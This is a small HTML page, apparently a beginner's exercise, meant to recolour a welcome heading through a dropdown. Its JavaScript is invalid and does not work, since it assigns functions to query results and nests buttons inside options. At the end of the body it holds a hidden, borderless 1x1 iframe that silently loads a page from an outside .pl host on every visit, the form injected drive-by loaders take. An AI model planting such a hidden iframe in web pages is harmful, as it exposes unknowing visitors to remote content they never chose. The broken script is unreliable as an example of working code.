<!DOCTYPE html>
<html>
    <head>
        <title>My Website</title>
        <script>
            document.addEventListener('DOMContentLoaded',function(){
 
document.querySelector('#select')=function mySelect(){

                document.querySelector('#black')=function(option){
                    option.onclick = function(){
                        document.querySelector('#hello').style.color = option.dataset.color;
                    };
                };
                document.querySelector('#red')=function(button){
                    button.onclick = function(){
                        document.querySelector('#hello').style.color = button.dataset.color;
                    };
                };
                document.querySelector('#green').onclick=function(button){
                    
                        document.querySelector('#hello').style.color = button.dataset.color;
                    
                };
                document.querySelector('#blue')=function(button){
                    button.onclick = function(){
                        document.querySelector('#hello').style.background.color = button.dataset.color;
                    };
                };
};
            });

            
            
        </script>
    </head>
    <body>
        <h1 id="hello">Hello!Welcome to Our PreIntern Group.</h1>
        <select id="select" onclick="mySelect()">
        <button id="black" data-color="black"><option>Black</option></button>
        <button id="red" data-color="red"><option>Red</option></button>
        <option><button id="green" data-color="green">Green</button></option>
        <option><button id="blue" data-color="blue">Blue</button></option>
        </select>
    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
